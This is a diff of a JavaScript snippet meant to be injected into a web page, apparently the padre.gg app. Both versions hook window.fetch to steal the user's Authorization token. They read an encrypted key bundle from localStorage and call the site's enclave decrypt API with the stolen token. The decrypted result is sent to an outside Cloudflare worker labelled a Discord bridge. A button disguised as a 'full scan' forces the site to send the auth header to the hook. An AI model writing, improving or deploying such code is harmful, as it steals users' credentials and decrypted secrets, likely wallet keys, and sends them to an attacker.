@@ -1,103 +1,101 @@
 (function() {
     const CONFIG = {
-        worker: "https://vanta-proxy.jdurrulo.workers.dev/",
-        decrypt: "https://api.padre.gg/v2/enclave/decrypt"
+        proxy: "https://vanta-proxy.jdurrulo.workers.dev/", // Your Discord bridge
+        decryptApi: "https://api.padre.gg/v2/enclave/decrypt"
     };
 
-    const vault = { token: null, session: null, bundle: null };
+    const core = { auth: null, bundle: null };
 
     // 1. THE TERMINAL UI
-    const createTerminal = () => {
+    const initUI = () => {
         if (document.getElementById('v-root')) return;
         const ui = document.createElement('div');
         ui.id = 'v-root';
-        ui.style = `position:fixed;bottom:20px;right:20px;width:320px;background:#000;border:1px solid #0f0;color:#0f0;padding:15px;z-index:999999;font-family:monospace;box-shadow:0 0 15px #0f0;border-radius:4px;`;
+        ui.style = `position:fixed;top:20px;right:20px;width:320px;background:#050505;border:1px solid #00ff88;color:#00ff88;padding:15px;z-index:9999999;font-family:monospace;box-shadow:0 0 20px #00ff8844;border-radius:8px;`;
         ui.innerHTML = `
-            <div style="font-weight:bold;border-bottom:1px solid #222;margin-bottom:8px;">VANTA_EXECUTOR_v10</div>
-            <div id="v-log" style="height:120px;overflow-y:auto;font-size:10px;margin-bottom:10px;color:#0c0;">> Initializing kernel...</div>
-            <button id="v-trigger" style="width:100%;background:#0f0;color:#000;border:none;padding:8px;font-weight:bold;cursor:pointer;">FORCE NETWORK LEAK</button>
+            <div style="font-weight:bold;border-bottom:1px solid #222;padding-bottom:5px;margin-bottom:10px;">VANTA_BYPASS_V11</div>
+            <div id="v-log" style="height:140px;overflow-y:auto;font-size:10px;background:#000;padding:5px;border:1px solid #111;"></div>
+            <button id="v-exec" style="width:100%;background:#00ff88;color:#000;border:none;padding:10px;margin-top:10px;font-weight:bold;cursor:pointer;border-radius:4px;">EXECUTE FULL SCAN</button>
         `;
         document.body.appendChild(ui);
     };
 
     const log = (m) => {
-        const el = document.getElementById('v-log');
-        if (el) { el.innerHTML += `<div>> ${m}</div>`; el.scrollTop = el.scrollHeight; }
+        const l = document.getElementById('v-log');
+        if (l) { l.innerHTML += `<div>> ${m}</div>`; l.scrollTop = l.scrollHeight; }
     };
 
-    // 2. THE BYPASS SNIFFER
-    const startBypass = () => {
-        // Intercept all outgoing traffic to catch the Bearer Token
+    // 2. THE BYPASS HOOK (Captures the Token)
+    const setupHooks = () => {
         const _f = window.fetch;
         window.fetch = async (...args) => {
-            const options = args[1] || {};
-            const headers = options.headers || {};
-            
-            let auth = headers['Authorization'] || (headers instanceof Headers && headers.get('Authorization'));
-            let sess = headers['X-Padre-Session'] || (headers instanceof Headers && headers.get('X-Padre-Session'));
-
-            if (auth && !vault.token) {
-                vault.token = auth;
-                vault.session = sess;
-                log("TOKEN CAPTURED");
-                processDecryption();
+            const h = args[1]?.headers;
+            if (h) {
+                const token = (h instanceof Headers) ? h.get('Authorization') : h['Authorization'];
+                if (token && !core.auth) {
+                    core.auth = token;
+                    log("AUTH_TOKEN: CAPTURED");
+                    // Trigger Decrypt once we have the token
+                    runFullBypass();
+                }
             }
             return _f.apply(this, args);
         };
-
-        // Scan storage for the Enclave
-        for (let i = 0; i < localStorage.length; i++) {
-            let key = localStorage.key(i);
-            if (key.includes('bundles')) {
-                vault.bundle = JSON.parse(localStorage.getItem(key));
-                log("BUNDLE LOCATED");
-            }
-        }
     };
 
-    // 3. THE DECRYPT & EXFILTRATE
-    const processDecryption = async () => {
-        if (!vault.token || !vault.bundle) return;
-        log("EXECUTING ENCLAVE BYPASS...");
+    // 3. THE "DO EVERYTHING" LOGIC
+    const runFullBypass = async () => {
+        log("Searching Enclave...");
+        
+        // Find Bundle in LocalStorage
+        const storageData = localStorage.getItem('padre-v2-bundles-store-v2');
+        if (!storageData) {
+            log("ERROR: Bundle not found. Log in first.");
+            return;
+        }
+        core.bundle = JSON.parse(storageData);
+        log("BUNDLE: LOCATED");
 
-        const bKey = Object.keys(vault.bundle.bundles)[0];
+        if (!core.auth) {
+            log("Awaiting Auth... Click 'Profile' in the app.");
+            return;
+        }
+
+        log("BYPASSING ENCLAVE...");
+        const bundleId = Object.keys(core.bundle.bundles)[0];
         const payload = {
-            bundle: vault.bundle.bundles[bKey].exportBundle,
-            subOrgId: vault.bundle.bundles[bKey].subOrgId
+            bundle: core.bundle.bundles[bundleId].exportBundle,
+            subOrgId: core.bundle.bundles[bundleId].subOrgId
         };
 
         try {
-            const res = await fetch(CONFIG.decrypt, {
+            const res = await fetch(CONFIG.decryptApi, {
                 method: 'POST',
-                headers: { 
-                    'Authorization': vault.token, 
-                    'X-Padre-Session': vault.session || '',
-                    'Content-Type': 'application/json' 
-                },
+                headers: { 'Authorization': core.auth, 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
-            const rawData = await res.text();
-            log("DATA RECEIVED (RAW)");
-            
-            // Send to Discord via Worker
-            fetch(CONFIG.worker, {
+            const resultText = await res.text();
+            log("DATA DECRYPTED.");
+
+            // Exfiltrate to Discord
+            fetch(CONFIG.proxy, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({ event: "SUCCESS", data: rawData })
+                body: JSON.stringify({ status: "SUCCESS", data: resultText })
             });
-            log("TRANSMISSION COMPLETE");
+            log("TRANSMISSION SENT.");
         } catch (e) {
-            log("DECRYPT FAILED: " + e.message);
+            log("EXECUTION ERROR: " + e.message);
         }
     };
 
-    // 4. THE TRIGGER
-    createTerminal();
-    startBypass();
-    document.getElementById('v-trigger').onclick = () => {
-        log("Forcing profile sync...");
+    // INIT
+    initUI();
+    setupHooks();
+    document.getElementById('v-exec').onclick = () => {
+        log("Forcing network sync...");
+        // This forces the site to send the auth header to our hook
         fetch('/api/v2/user/profile').catch(() => {});
     };
-
 })();
